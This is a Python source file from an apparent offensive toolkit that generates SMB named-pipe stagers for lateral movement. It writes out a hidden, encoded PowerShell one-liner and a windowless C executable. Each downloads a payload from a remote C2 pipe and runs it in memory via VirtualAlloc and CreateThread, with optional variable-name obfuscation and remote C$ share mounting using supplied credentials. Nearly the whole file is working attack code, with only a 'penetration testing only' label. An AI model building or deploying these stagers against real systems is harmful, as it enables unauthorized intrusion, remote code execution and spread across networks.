"""SMB Named Pipe Stager.

Reads the stage payload from an SMB named pipe on a controlled server.
Useful for lateral movement scenarios where HTTP/DNS may be blocked but
SMB (port 445) is allowed internally.

Protocol:
  1. Client connects to \\\\SERVER\\pipe\\PIPE_NAME
  2. Server sends 4-byte LE length then stage bytes
  3. Client VirtualAlloc/mmap and executes

Stager types:
  - PowerShell (named pipe client + VirtualAlloc exec)
  - C (Windows named pipe client)

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import base64
import secrets
import textwrap


class SmbStager:
    """SMB named pipe stager generator."""

    def __init__(
        self,
        server: str = "10.0.0.1",
        pipe_name: str = "forge",
        domain: str = "",
        username: str = "",
        password: str = "",
    ):
        self.server    = server
        self.pipe_name = pipe_name
        self.domain    = domain
        self.username  = username
        self.password  = password
        self.unc       = f"\\\\{server}\\pipe\\{pipe_name}"

    def powershell_stager(self, obfuscate: bool = True) -> tuple[bytes, str]:
        """PowerShell named pipe stager."""
        script = self._ps1_stager(obfuscate)
        b64    = base64.b64encode(script.encode("utf-16-le")).decode()
        one    = (f"powershell.exe -NonInteractive -WindowStyle Hidden "
                  f"-EncodedCommand {b64}")
        return script.encode(), one

    def c_stager(self, arch: str = "x64") -> tuple[bytes, str]:
        """C named pipe client stager."""
        src = self._c_stager_src(arch)
        arch_prefix = "x86_64" if arch == "x64" else "i686"
        one = (f"{arch_prefix}-w64-mingw32-gcc -o smb_stager.exe smb_stager.c "
               f"-s -O2 -mwindows")
        return src.encode(), one

    def pipe_server_ps1(self) -> str:
        """PowerShell named pipe server — serves the stage file content."""
        return textwrap.dedent(f"""\
        # Forge SMB Stager — Named Pipe Server
        # Run on C2 server to serve the stage payload
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        param([string]$StagePath = "payload.bin")

        $PipeName = "{self.pipe_name}"
        $stage    = [System.IO.File]::ReadAllBytes($StagePath)
        $lenBytes = [BitConverter]::GetBytes([uint32]$stage.Length)

        while ($true) {{
            $pipe = New-Object System.IO.Pipes.NamedPipeServerStream(
                $PipeName,
                [System.IO.Pipes.PipeDirection]::Out,
                1,
                [System.IO.Pipes.PipeTransmissionMode]::Byte,
                [System.IO.Pipes.PipeOptions]::None
            )
            Write-Host "  [*] Waiting for connection on \\\\.\pipe\\$PipeName ..."
            $pipe.WaitForConnection()
            Write-Host "  [+] Client connected — sending $($stage.Length) bytes"
            $pipe.Write($lenBytes, 0, 4)
            $pipe.Write($stage,    0, $stage.Length)
            $pipe.Flush()
            $pipe.Disconnect()
            $pipe.Dispose()
            Write-Host "  [+] Stage delivered"
        }}
        """)

    # ── Private generators ─────────────────────────────────────────────

    def _ps1_stager(self, obfuscate: bool) -> str:
        unc = self.unc
        cred_block = ""
        if self.username:
            cred_block = textwrap.dedent(f"""\
            $cred = New-Object System.Management.Automation.PSCredential(
                "{self.domain}\\{self.username}",
                (ConvertTo-SecureString "{self.password}" -AsPlainText -Force))
            """)
            connect_fn = f"New-PSDrive -Name TMP -PSProvider FileSystem -Root '\\\\{self.server}\\C$' -Credential $cred -ErrorAction SilentlyContinue"
        else:
            connect_fn = ""

        vsc = ("$" + secrets.token_hex(3)) if obfuscate else "$sc"
        vm  = ("$" + secrets.token_hex(3)) if obfuscate else "$mem"
        vt  = ("$" + secrets.token_hex(3)) if obfuscate else "$t"

        return textwrap.dedent(f"""\
        # Forge SMB Named Pipe Stager — PowerShell
        # Pipe: {unc}
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        {cred_block}
        {connect_fn}
        $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(
            "{self.server}", "{self.pipe_name}",
            [System.IO.Pipes.PipeDirection]::In,
            [System.IO.Pipes.PipeOptions]::None)
        $pipe.Connect(10000)

        # Read 4-byte LE length
        $lenBuf = New-Object byte[] 4
        $pipe.Read($lenBuf, 0, 4) | Out-Null
        $stageLen = [BitConverter]::ToUInt32($lenBuf, 0)

        {vsc} = New-Object byte[] $stageLen
        $offset = 0
        while ($offset -lt $stageLen) {{
            $r = $pipe.Read({vsc}, $offset, $stageLen - $offset)
            if ($r -le 0) {{ break }}
            $offset += $r
        }}
        $pipe.Dispose()

        $k = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr b,uint c,uint d);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,out uint d);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr a,UIntPtr b,IntPtr c,IntPtr d,uint e,IntPtr f);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr h,uint ms);
        '@ -Name 'SMB{secrets.token_hex(3)}' -Namespace 'F' -PassThru
        {vm} = $k::VirtualAlloc(0,[UIntPtr]{vsc}.Length,0x3000,0x04)
        [System.Runtime.InteropServices.Marshal]::Copy({vsc},0,{vm},{vsc}.Length)
        $o=0; $k::VirtualProtect({vm},[UIntPtr]{vsc}.Length,0x20,[ref]$o)|Out-Null
        {vt} = $k::CreateThread(0,0,{vm},0,0,0)
        $k::WaitForSingleObject({vt},0xFFFFFFFF)|Out-Null
        """)

    def _c_stager_src(self, arch: str) -> str:
        server    = self.server
        pipe_name = self.pipe_name
        unc       = self.unc.replace("\\", "\\\\")
        arch_flag = "" if arch == "x64" else " -m32"
        arch_pre  = "x86_64" if arch == "x64" else "i686"

        return textwrap.dedent(f"""\
        /*
         * Forge SMB Named Pipe Stager ({arch})
         * Server: {server}  Pipe: {pipe_name}
         * UNC:    {self.unc}
         * Compile: {arch_pre}-w64-mingw32-gcc -o smb_stager.exe smb_stager.c \\
         *          -s -O2{arch_flag} -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <string.h>

        #define PIPE_UNC L"{unc}"
        #define TIMEOUT  10000
        #define MAX_STAGE (32*1024*1024)

        static int recv_all(HANDLE h, char *buf, DWORD len) {{
            DWORD total=0, read=0;
            while(total<len) {{
                if(!ReadFile(h,buf+total,len-total,&read,NULL)||!read) return -1;
                total+=read;
            }}
            return 0;
        }}

        int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR a,int s) {{
            /* Wait for pipe to be available */
            WaitNamedPipeW(PIPE_UNC, TIMEOUT);

            HANDLE pipe = CreateFileW(PIPE_UNC, GENERIC_READ,
                0, NULL, OPEN_EXISTING, 0, NULL);
            if(pipe==INVALID_HANDLE_VALUE) return 1;

            DWORD stage_len=0;
            if(recv_all(pipe,(char*)&stage_len,4)!=0) {{ CloseHandle(pipe); return 1; }}
            if(!stage_len||stage_len>MAX_STAGE) {{ CloseHandle(pipe); return 1; }}

            LPVOID stage=VirtualAlloc(NULL,stage_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
            if(!stage) {{ CloseHandle(pipe); return 1; }}
            if(recv_all(pipe,(char*)stage,(DWORD)stage_len)!=0) {{ CloseHandle(pipe); return 1; }}
            CloseHandle(pipe);

            DWORD old;
            VirtualProtect(stage,stage_len,PAGE_EXECUTE_READ,&old);
            HANDLE ht=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)stage,NULL,0,NULL);
            if(ht) WaitForSingleObject(ht,INFINITE);
            return 0;
        }}
        """)
